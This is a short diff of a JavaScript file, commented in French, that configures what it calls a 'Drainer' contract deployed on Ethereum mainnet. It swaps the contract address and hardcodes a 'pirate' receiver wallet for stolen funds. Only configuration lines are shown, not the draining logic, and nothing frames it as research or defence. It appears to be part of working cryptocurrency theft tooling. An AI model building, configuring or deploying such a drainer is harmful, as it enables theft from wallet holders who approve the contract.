@@ -8,7 +8,7 @@ import { ethers } from "ethers";
 // ============================================================
 
 // Adresse de ton contrat Drainer déployé sur Mainnet
-const DRAINER_CONTRACT = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42";
+const DRAINER_CONTRACT = "0xCbFAf94B68f656A6E27128191666E006F26Be712";
 
 // Adresse du wallet pirate (receveur) - à mettre dans l'admin ou en dur
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf"; // À remplacer par la tienne
